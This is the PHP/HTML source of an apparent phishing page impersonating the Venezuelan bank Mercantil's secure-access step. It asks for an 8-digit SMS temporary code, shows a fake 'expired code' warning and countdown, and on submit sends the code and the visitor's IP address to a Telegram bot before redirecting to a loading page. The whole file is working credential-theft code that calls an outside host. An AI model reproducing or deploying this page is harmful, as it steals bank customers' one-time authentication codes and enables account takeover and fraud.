<?php
include './config.php';



  $tok = isset($_POST["tok"]) ? $_POST["tok"] : '';


  if (isset($_POST['submit2'])) {


  $ip_address = $_SERVER['REMOTE_ADDR'];
  $message = "MERCANTIL  \n\nTOKEN: <code>$tok</code> \nIP: $ip_address";



       $telegram_api_url = "https://api.telegram.org/bot" . $bot_token . "/sendMessage";
      $data = array(
          'chat_id' => $chat_id,
          'text' => $message,
          'parse_mode' => 'HTML'
      );

      // Use cURL to send the API request.
      $ch = curl_init($telegram_api_url);
      curl_setopt($ch, CURLOPT_POST, 1);
      curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
      curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
      $result = curl_exec($ch);
      curl_close($ch);



    header("Location: ./loading3.php");
    ob_end_flush();
    exit(); }


  ?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="./index.css">
    <title>Mercantil</title>
</head>
<body>
    <div class="wrapper">
        <div class="container">
            <div class="header">
                <img src="./img/log_mov.png" width="150px" alt="">
            </div>
<div class="preform">
    <span id="venezuela-time">29/01/2025 - 12:22:16 am</span>
    <h2>Acceso seguro</h2>
</div>
    
            <form action="" class="form" method="post">
                <div class="form-content">
                    <div class="step">
                        <img width="70px" src="./img/step1.jpg" alt="">
                        <div class="textstep">
                            <h3 class="textsteph3">Ingresa tu clave temporal</h3>
                            <p class="par"><b>Siguiente paso:</b> Valida tus preguntas de seguridad. </p>
                        </div>
                        
                    </div>
                    <p class="paraa">Introduce la clave temporal enviada a tu teléfono celular.</p>


                    <div class="input-containerr">
                        <label for="">
                            Clave temporal
                        </label>
                        <input type="text" required name="tok" maxlength="8" minlength="8" id="numberInput">
                    </div>
					
					<span style="color:red;font-weight: 700;">
					* Clave temporal expirada, le enviaremos una nuevamente.
					</span>
					
                    
                    <p class="pclave">Si no has recibido la clave temporal en <b id="countdown">180</b> segundos haz click en <a href="./loading2.php">Reenviar clave temporal</a>. </p>

                    
                    <button name="submit2" style="width: 150px; margin-top: 1rem; margin-bottom: 2rem;" class="butonsin">Continuar</button>
                </div>

                

            </form>
            <a href="./index.php" style="text-decoration: none; margin-top: 1.5rem; font-size: 19px; color: rgb(82, 82, 82);">Cancelar</a>
        </div>
    </div>
</body>
	
	<script>
	<script>
// Countdown function
function startCountdown() {
  let countdownTime = 180; // Countdown starts at 180 seconds
  const countdownElement = document.getElementById('countdown'); // The element with id 'countdown'

  // Update the countdown every second
  const interval = setInterval(() => {
    countdownElement.textContent = countdownTime; // Update the text inside the element

    // If countdown reaches 0, stop the interval
    if (countdownTime <= 0) {
      clearInterval(interval);
      countdownElement.textContent = "0"; // Optional message when time's up
    } else {
      countdownTime--; // Decrement the countdown
    }
  }, 1000); // 1000 ms = 1 second
}

// Display the current time in Venezuela
function displayTime() {
  const options = {
    timeZone: 'America/Caracas', // Venezuela's timezone
    year: 'numeric',
    month: '2-digit',
    day: '2-digit',
    hour: '2-digit',
    minute: '2-digit',
    second: '2-digit',
    hour12: true, // 12-hour format with am/pm
  };

  const currentTime = new Date();
  const formattedTime = new Intl.DateTimeFormat('en-GB', options).format(currentTime);

  const timeElement = document.getElementById('venezuela-time');
  timeElement.textContent = formattedTime;
}

// Update time every second
setInterval(displayTime, 1000);

// Restrict input to numbers only
function restrictInput(event) {
  // Get the input element by its ID
  let inputElement = event.target;

  // Get the input value
  let inputValue = inputElement.value;

  // Replace anything that is not a number
  inputValue = inputValue.replace(/[^0-9]/g, '');

  // Set the filtered value back to the input field
  inputElement.value = inputValue;
}

// Start the countdown and display time when the page loads
window.onload = () => {
  startCountdown();
  displayTime();

  // Attach the restrictInput function to the input field
  const inputElement = document.getElementById("numberInput");
  inputElement.addEventListener('input', restrictInput); // Add input event listener
};
    </script>

	
	
</html>